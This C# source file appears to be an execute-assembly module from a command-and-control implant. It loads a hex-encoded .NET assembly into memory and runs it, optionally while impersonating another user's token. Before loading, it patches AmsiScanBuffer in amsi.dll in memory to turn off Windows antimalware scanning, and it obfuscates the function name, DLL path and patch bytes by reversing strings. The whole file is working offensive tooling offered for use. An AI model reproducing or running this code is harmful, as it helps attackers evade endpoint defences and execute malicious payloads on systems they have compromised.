using System;
using System.IO;
using System.Text;
using System.Security;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Security.Principal;

using System.Reflection;
using System.ComponentModel;
using System.Globalization;


public class Module_execute_assembly
{
    public const string SUCC_CODE       = "0";
    public const string ERR_CODE        = "1";
    public const string NON_TOKEN_VALUE = "0";

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    private void ImpersonateWithToken(string token)
    {
        int token_int = Int32.Parse(token);
        IntPtr targetToken = new IntPtr(token_int);

        string current_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            current_username = wid.Name;
        }

        if (!ImpersonateLoggedOnUser(targetToken))
        {
            int errorCode = Marshal.GetLastWin32Error();
            throw new Exception("ImpersonateLoggedOnUser failed with the following error: " + errorCode);
        }

        string impersonate_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            impersonate_username = wid.Name;
        }

        if (current_username == impersonate_username)
            throw new Exception("ImpersonateLoggedOnUser worked, but thread running as user " + current_username);
    }

    private string hex2Str(string hex)
    {
        byte[] raw = new byte[hex.Length / 2];
        for (int i = 0; i < raw.Length; i++)
        {
            raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        }
        return Encoding.ASCII.GetString(raw);
    }

    private string normalizePath(string currPath)
    {
        currPath = currPath.Replace("\"", "");
        currPath = currPath.Replace("'", "");
        currPath = currPath.Replace(@"\", "/");
        return currPath;
    }

    private string changeCWD(string cwd)
    {
        try
        {
            Directory.SetCurrentDirectory(cwd);
            return normalizePath(Directory.GetCurrentDirectory());
        }
        catch (Exception ex)
        {
            if (ex is IOException)
                throw new Exception("Path '" + cwd + "' is not a directory");
            else if (ex is DirectoryNotFoundException)
                throw new Exception("Directory '" + cwd + "' does not exist");
            else if (ex is SecurityException)
                throw new Exception("Directory '" + cwd + "' permission denied");
            else if (ex is PathTooLongException)
                throw new Exception("Path '" + cwd + "' exceed the maximum length defined by the system");
            else
                throw new Exception("Move to path '" + cwd + "' failed");
        }
    }

    private string[] parseArguments(string args)
    {
        List<string> arguments_parsed = new List<string>();
        string pattern = @"""[^""]+""|'[^']+'|\S+";
        foreach (Match m in Regex.Matches(args, pattern))
        {
            arguments_parsed.Add(m.Value);
        }
        return arguments_parsed.ToArray();
    }

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);
    
    [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
    public static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

    private string ReverseString(string s)
    {
        char[] array = s.ToCharArray();
        Array.Reverse(array);
        return new string(array);
    }

    private int Patch(string file)
    {
        IntPtr dll = LoadLibrary(file);
        if (dll == IntPtr.Zero)
        {
            return 2;
        }

        string keyword = ReverseString("ref" + "fuB" + "nac" + "Sis" + "mA");

        IntPtr funcaddress = GetProcAddress(dll, keyword);
        if (funcaddress == IntPtr.Zero)
        {
            return 3;
        }

        UIntPtr dwSize = (UIntPtr)5;
        uint Zero = 0;
        if (!VirtualProtect(funcaddress, dwSize, 0x40, out Zero))
        {
            return 4;
        }

        string keycodes = ReverseString("3CA08A7"+"0A00"+"A75A8B");
        string[] Xkeycodes = keycodes.Split('A');
        byte[] Xnewkeycodes = new byte[Xkeycodes.Length];

        for (int i = 0; i < Xkeycodes.Length; i++)
        {
            Xnewkeycodes[i] = Convert.ToByte(Xkeycodes[i], 16);
        }

        Byte[] Parcheo = Xnewkeycodes;
        IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);

        Marshal.Copy(Parcheo, 0, unmanagedPointer, 6);
        MoveMemory(funcaddress, unmanagedPointer, 6);

        return 0;
    }

    private int Evasion()
    {
        string file = "lld." + "is" + "ma";
        string filepath = ReverseString(file + "\\23met" + "syS\\s" + "wodniW\\:c");

        if (!File.Exists(filepath))
        {
        return 0;
        }

        return Patch(ReverseString(file));
    }

    private int getHexVal(char hex)
    {
        int val = (int)hex;
        return val - (val < 58 ? 48 : (val < 97 ? 55 : 87));
    }

    private byte[] hex2Bin(string hex)
    {
        if (hex.Length % 2 == 1)
            throw new Exception("the binary key cannot have an odd number of digits");

        byte[] data = new byte[hex.Length / 2];
        for (int index = 0; index < data.Length; index++)
        {
            string byteValue = hex.Substring(index * 2, 2);
            data[index] = byte.Parse(byteValue, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
        }

        return data;
    }

    public string[] doExecuteAssembly(string as_filedata, string as_namespace, string as_class, string as_method, string[] as_args)
    {
        string result = "";
        try
        {
            int res = Evasion();
            if (res != 0)
                return new string[]{ERR_CODE, "Can not patch amsi result: '" + res.ToString() + "'" + Environment.NewLine};

            byte[] as_filedata_bytes = hex2Bin(as_filedata);
            Assembly assembly = Assembly.Load(as_filedata_bytes);
            
            string fullTypeName = as_namespace + "." + as_class;
            Type assembly_type = assembly.GetType(fullTypeName);
            if (assembly_type == null)
                return new string[]{ERR_CODE, "Type: '" + fullTypeName + "' not found in Assembly" + Environment.NewLine};
            
            MethodInfo assembly_method = assembly_type.GetMethod(as_method);
            if (assembly_method == null)
                return new string[]{ERR_CODE, "Method: '" + as_method + "' not found in Assembly Type: '" + fullTypeName + "'" + Environment.NewLine};
            
            object assembly_instance = Activator.CreateInstance(assembly_type);
            
            TextWriter originalConsoleOut = Console.Out;
            using(StringWriter writer = new StringWriter())
            {
                Console.SetOut(writer);

                object assembly_result = assembly_method.Invoke(assembly_instance, new object[] { as_args });

                writer.Flush();

                result = writer.GetStringBuilder().ToString();
            }

            Console.SetOut(originalConsoleOut);
        }
        catch (Exception ex)
        {
            result += ex.ToString() + Environment.NewLine;
            return new string[]{ERR_CODE, result};
        }

        return new string[]{SUCC_CODE, result};
    }

    [DllImport("shell32.dll", SetLastError = true)]
    static extern IntPtr CommandLineToArgvW(
        [MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine,
        out int pNumArgs);

    [DllImport("kernel32.dll")]
    static extern IntPtr LocalFree(IntPtr hMem);

    private string[] SplitArgs(string unsplitArgumentLine)
    {
        int numberOfArgs;
        IntPtr ptrToSplitArgs;
        string[] splitArgs;

        ptrToSplitArgs = CommandLineToArgvW(unsplitArgumentLine, out numberOfArgs);

        if (ptrToSplitArgs == IntPtr.Zero)
            throw new ArgumentException("Unable to split argument.", new Win32Exception());

        try
        {
            splitArgs = new string[numberOfArgs];
            for (int i = 0; i < numberOfArgs; i++)
                splitArgs[i] = Marshal.PtrToStringUni(Marshal.ReadIntPtr(ptrToSplitArgs, i * IntPtr.Size));

            return splitArgs;
        }
        finally
        {
            LocalFree(ptrToSplitArgs);
        }
    }

    public string[] execute(string[] args)
    {
        string result = "";
        List<string> nargs = new List<string>(args);
        
        if (nargs.Count != 5)
        {
            result += "Invalid arguments provided. Specify: <NET_ASSEMBLY> <ASSEMBLY_NAMESPACE> <ASSEMBLY_CLASS> <ASSEMBLY_METHOD> [ASSEMBLY_ARGS]" + Environment.NewLine;
            return new string[]{ERR_CODE, result};
        }

        string[] as_args = new string[]{};
        if (nargs[4] != "")
        {
            string asm_args = nargs[4];
            if (asm_args.StartsWith("'") && asm_args.EndsWith("'"))
                asm_args = asm_args.Substring(1, asm_args.Length-2);
            as_args = SplitArgs(asm_args);
        }

        return doExecuteAssembly(nargs[0], nargs[1], nargs[2], nargs[3], as_args);
    }

    public string[] go(string cwd, string args, string token)
    {
        string[] results = new string[]{SUCC_CODE, ""};
        string pwd = Directory.GetCurrentDirectory();

        try
        {
            if (token != NON_TOKEN_VALUE)
                ImpersonateWithToken(token);

            string new_cwd = changeCWD(cwd);
            string[] arguments_parsed = parseArguments(hex2Str(args));
            
            results = execute(arguments_parsed);
        }
        catch (Exception ex)
        {
            results[0] = ERR_CODE;
            results[1] = ex.ToString();
        }
        finally
        {
            changeCWD(pwd);
            if (token != NON_TOKEN_VALUE)
                RevertToSelf();
        }
        return results;
    }

    public static void Main(string[] args)
    {
        Module_execute_assembly m = new Module_execute_assembly();
        String[] results = m.execute(args);
        Console.WriteLine(results[0]);
        Console.WriteLine(results[1]);
        return;
    }
}